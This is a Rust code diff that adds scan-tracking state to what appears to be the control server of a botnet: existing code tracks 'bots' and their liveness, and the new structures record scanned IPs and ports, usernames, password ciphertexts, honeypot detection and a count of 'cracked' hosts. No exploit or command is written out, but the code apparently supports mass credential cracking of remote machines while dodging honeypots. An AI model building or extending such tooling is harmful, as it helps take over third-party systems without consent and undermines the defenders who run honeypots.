@@ -31,6 +31,8 @@ pub struct AppState {
     pub bots_last_save: RwLock<Instant>,
     pub http_client: reqwest::Client,
     bots_path: std::path::PathBuf,
+    pub scan_results: RwLock<Vec<ScanEntry>>,
+    pub scan_status: RwLock<ScanStatus>,
 }
 
 #[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
@@ -42,7 +44,29 @@ pub struct BotInfo {
 }
 
 const BOTS_SAVE_INTERVAL: Duration = Duration::from_secs(10);
-pub const BOT_ALIVE_THRESHOLD: f64 = 600.0; // 10 minutes
+pub const BOT_ALIVE_THRESHOLD: f64 = 600.0;
+
+#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
+pub struct ScanEntry {
+    pub ip: String,
+    pub port: u16,
+    pub banner: Option<String>,
+    pub username: Option<String>,
+    pub password_ciphertext: Option<String>,
+    pub is_honeypot: bool,
+    pub timestamp: f64,
+}
+
+#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
+pub struct ScanStatus {
+    pub running: bool,
+    pub targets_total: u64,
+    pub targets_scanned: u64,
+    pub open_ports: u64,
+    pub honeypots: u64,
+    pub cracked: u64,
+    pub started_at: f64,
+}
 
 impl AppState {
     pub fn new(api_config: ApiConfig, control_config: ControlConfig, bots_path: std::path::PathBuf) -> Result<Self> {
@@ -54,6 +78,11 @@ impl AppState {
             bots_last_save: RwLock::new(Instant::now()),
             http_client,
             bots_path,
+            scan_results: RwLock::new(Vec::new()),
+            scan_status: RwLock::new(ScanStatus {
+                running: false, targets_total: 0, targets_scanned: 0,
+                open_ports: 0, honeypots: 0, cracked: 0, started_at: 0.0,
+            }),
         })
     }
 
